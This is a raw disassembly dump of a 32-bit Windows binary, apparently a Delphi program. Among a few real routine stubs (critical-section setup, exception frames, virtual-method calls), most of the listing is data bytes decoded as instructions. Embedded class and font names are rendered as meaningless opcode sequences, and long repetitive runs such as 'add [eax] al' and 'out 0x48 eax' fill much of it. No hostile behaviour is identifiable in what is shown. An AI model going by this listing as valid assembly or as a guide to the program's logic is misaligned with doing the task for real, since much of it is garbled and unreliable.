call sub_406030
mov eax rw-data
call sub_40dabc
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_40dabc
sub_41f468
sub [ rw-data ] 0x1
jae r-xdata
retn
push rw-data
call InitializeCriticalSection
mov eax sub_41f1f8
call sub_406028
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d6e4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4150a0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166dc
mov [ rw-data ] eax
sub_41f4cc
adc al 0xe7
dec eax
add [ ebx + 0x140000ff ] al
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] al
dec eax
add [ ebp + 0x140000ff ] al
out 0x48 eax
add [ esi + 0x140000ff ] al
out 0x48 eax
add [ edi + 0x140000ff ] al
out 0x48 eax
add [ eax + 0x140000ff ] cl
out 0x48 eax
add [ ecx + 0x140000ff ] cl
out 0x48 eax
add [ edx + 0x140000ff ] cl
out 0x48 eax
add [ ebx + 0x140000ff ] cl
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] cl
dec eax
add [ ebp + 0x140000ff ] cl
out 0x48 eax
add [ esi + 0x140000ff ] cl
out 0x48 eax
add [ edi + 0x140000ff ] cl
out 0x48 eax
add [ eax - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] dh
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] bh
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] ah
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] ch
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] dl
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] bl
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] al
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
adc al 0xe7
dec eax
add [ eax - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ edx - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ edi + edi * 8 ] cl
add [ edi ] dl
dec eax
add [ ebp - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ esi - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
adc al 0xe7
dec eax
add [ eax ] dh
inc [ eax ]
add [ edi ] dl
dec eax
add [ ecx ] dh
inc [ eax ]
add [ edi ] dl
dec eax
add [ edx ] dh
inc [ eax ]
add [ edi ] dl
dec eax
add [ ebx ] dh
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi + edi * 8 ] dh
add [ eax ] al
adc al 0xe7
dec eax
add [ 0x140000ff ] dh
out 0x48 eax
add [ esi ] dh
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi ] dh
inc [ eax ]
add [ edi ] dl
dec eax
add [ eax ] bh
inc [ eax ]
add [ edi ] dl
dec eax
add [ ecx ] bh
inc [ eax ]
add [ edi ] dl
dec eax
add [ edx ] bh
inc [ eax ]
add [ edi ] dl
dec eax
add [ ebx ] bh
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi + edi * 8 ] bh
add [ eax ] al
adc al 0xe7
dec eax
add [ 0x140000ff ] bh
out 0x48 eax
add [ esi ] bh
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi ] bh
inc [ eax ]
add [ edi ] dl
dec eax
add [ eax ] ah
inc [ eax ]
add [ edi ] dl
dec eax
add [ ecx ] ah
inc [ eax ]
add [ edi ] dl
dec eax
add [ edx ] ah
inc [ eax ]
add [ edi ] dl
dec eax
add [ ebx ] ah
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi + edi * 8 ] ah
add [ eax ] al
adc al 0xe7
dec eax
add [ 0x140000ff ] ah
out 0x48 eax
add [ esi ] ah
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi ] ah
inc [ eax ]
add [ edi ] dl
dec eax
add [ eax ] ch
inc [ eax ]
add [ edi ] dl
dec eax
add [ ecx ] ch
inc [ eax ]
add [ edi ] dl
dec eax
add [ edx ] ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41f831
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f838
retn
sub_41f844
dec eax
clc
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
test al 0xf8
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0041f8 ] ch
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xf004036 ] dh
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ ecx + edi * 8 ] ax
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x18004036 ] dh
inc ebp
dec ecx
outsb
jbe r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
and al 0xf9
inc ecx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax ] ah
stc
inc ecx
add [ ecx ] cl
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
xchg esp eax
stc
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
je r-xdata
popa
jne r-xdata
jae r-xdata
popad
insd
nop
js r-xdata
je r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
dec esi
inc esi
inc ecx
add [ ecx ] al
or al 0x54
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
stc
inc ecx
add [ ebx + 0x41f9fcc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
nop
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60041f9 ] dl
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax - 0x6 ] ah
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xf9e4c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add al bh
stc
inc ecx
add [ edi ] al
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
outsd
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
nop
stc
inc ecx
add [ esi ] al
popad
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
or al 0xfc
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41fa6490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sti
inc ecx
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shl [ eax ] 0xfb
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41f96890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ ebx + edi * 8 ] bl
inc ecx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
push es
jo r-xdata
add [ eax ] al
xor al 0xfc
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
imul esp [ ebx + 0x73 ] 0xffff0001
nop
mov eax 0x41fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
cld
inc ecx
add al ch
cld
inc ecx
add [ eax ] al
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ecx - 0x4 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6a ] bl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ edx + ebp * 2 + 0x10041 ] al
std
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x800413a ] al
jpe r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
inc [ eax + edx + 0x540f0042 ]
inc edi
jb r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
inc ecx
mov eax eax
and bl bh
inc edi
jb r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
cld
inc ecx
add dh bl
cld
inc ecx
add [ eax + eax ] ah
add [ eax ] al
cwde
call sub_423e7d
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp - 0x5 ] si
inc ecx
add ah dh
cmp al [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc ecx
add [ eax ] cl
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
in al 0xfb
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xfb20c08b
adc [ edx ] al
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
sti
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
imul esp [ ebx + 0x73 ] 0xc08b0000
cmp ah bh
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add al bh
sti
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
nop
inc edi
add [ esi + esi + 0x40 ] dh
add [ ebx + edx + 0x6b680042 ] dl
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add al bl
adc eax [ edx ]
push cs
inc eax
imul sp [ ebp + 0x72 ] 0x114c
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 ] cl
imul esp [ ebx + 0x73 ] 0x41fbe490
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + edi * 8 ] dh
add [ esi ] cl
jo r-xdata
sub_41fd4b
push ss
inc edx
add ah bh
push ss
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
imul esp [ gs : edi + 0x68 ] 0x41f96474
add [ edi + edx ] ah
inc edx
add [ edi + edx ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
and cl bh
inc ecx
add [ eax + ebx ] cl
inc edx
add [ eax + ebx ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
cwde
pop ss
inc edx
add [ edi + edx + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
inc eax
loopne r-xdata
add al 0x1b
inc edx
add [ ebx + ebx ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xff34c08b
imul esp [ ebx + 0x73 ] 0xf8440004
inc ecx
add al bh
sbb [ edx ] eax
add [ edx ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
aam 0x17
inc edx
add al ah
pop ss
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
inc ecx
add ah dl
pop ss
add [ eax ] al
jae r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x80041fb ] bl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x1b ] bh
inc edx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + 0x600421b ] ah
push esp
inc edx
jb r-xdata
xor al 0xff
cli
inc ecx
add [ eax ] bl
add [ eax ] al
inc eax
sbb al [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add [ eax ] eax
add al 0x4d
outsd
clc
stc
inc ecx
add ah dl
sbb al [ edx ]
fcomp [ edx ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + 0x68004218 ] dh
imul eax [ ecx ] 0x70
imul eax [ ecx ] 0xffffffd8
sbb [ edx ] al
add al 0x54
push eax
outsb
lea eax [ eax ]
dec esp
inc [ ecx ]
pop es
add al 0x54
push eax
outsb
xor al 0xfe
inc ecx
add [ eax ] cl
cld
inc ecx
add [ eax + eax ] al
insb
lea eax [ eax ]
xor al 0xfe
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2 ] al
inc ecx
add [ eax + eax ] bl
add [ eax ] al
cwde
sti
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jns r-xdata
jae r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] bl
nop
dec esp
inc [ ecx ]
pop es
push es
push esp
inc edx
jb r-xdata
jb r-xdata
outsd
in al 0xfc
inc ecx
add [ eax + eax ] cl
add bh bh
imul esp [ ebx + 0x73 ] 0xff480004
inc ecx
add [ eax + eax ] dl
add bh bh
and al 0x24
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ edx ] al
pop es
pop es
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] al
pop eax
add [ eax ] al
add [ eax + 0x800413a ] al
jae r-xdata
jb r-xdata
jae r-xdata
je r-xdata
inc [ ecx ]
adc [ eax ] al
add bh bh
sbb [ edx + eax * 2 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
rol [ eax ] 0x42
add [ eax ] cl
push cs
outsb
jae r-xdata
or [ edx + eax * 2 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
sbb al 0x0
xor al 0xff
inc ecx
add [ eax ] cl
cld
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
mov dl 0xdd
jae r-xdata
outsb
mov eax eax
int3
xchg [ esp ] eax
retn
inc ebp
jbe r-xdata
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
push cs
add eax 0xffffffdc
push eax
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
push esp
inc ebx
popad
outsb
jbe r-xdata
inc [ ecx ]
hlt
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax + eax ] ah
inc edx
mov eax [ eax ]
mov eax [ eax + 0x54 ]
ror ah 0x83
je r-xdata
outsb
add [ esp + 0x4 ] 0xffffffdc
jmp r-xdata
jb r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
jae r-xdata
dec ebp
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah dh
push ds
inc edx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ edx + ebp * 2 + 0x26440041 ] al
inc edx
add [ eax ] dh
inc edx
add [ ebp + 0x42 ] ah
add [ edi ] al
push esp
inc ebx
popad
adc [ eax ] al
inc edx
add [ eax ] bl
add [ eax ] al
cmp [ edx ] 0x41
add [ eax ] cl
imul esp [ ebx + 0x73 ] 0xf8440002
inc ecx
add al bl
sbb al 0x42
add al ah
sbb al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
and al 0x4
jae r-xdata
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ ebx + 0x4875840 ] cl
and al 0xc3
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
je r-xdata
jns r-xdata
sti
inc ecx
add ah dh
sbb eax 0x1dfc0042
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp r-xdata
push ebx
add al 0x8b
add bh bh
pushad
or al 0x83
inc esp
and al 0x4
add [ gs : bp + di ] cl
push eax
jb r-xdata
outsb
jbe r-xdata
lea eax [ eax ]
clc
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebp
retn 0x4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
fsub st1
adc [ ebx - 0x1 ] ebp
outsb
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
mov eax [ eax ]
outsd
outsb
add al 0x42
jns r-xdata
pop ebp
retn 0x4
inc edx
add [ 0x42004201 ] dh
add [ edx ] eax
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fnsave [ ebx + 0x1 ]
add [ gs : ecx ] cl
push edx
jb r-xdata
int3
ja r-xdata
outsd
ja r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
adc [ ebx + 0x4fc000da ] eax
pushad
push ebx
je r-xdata
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
hlt
rcr ah 0x50
imul ebp [ esi + 0x67 ] 0x83ccc08b
sub_42002a
cmp al [ ecx ]
add al 0x0
or [ edi + 0x72 ] al
popad
jo r-xdata
inc [ ecx ]
adc [ eax ] al
add bh bh
sbb [ edx + eax * 2 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
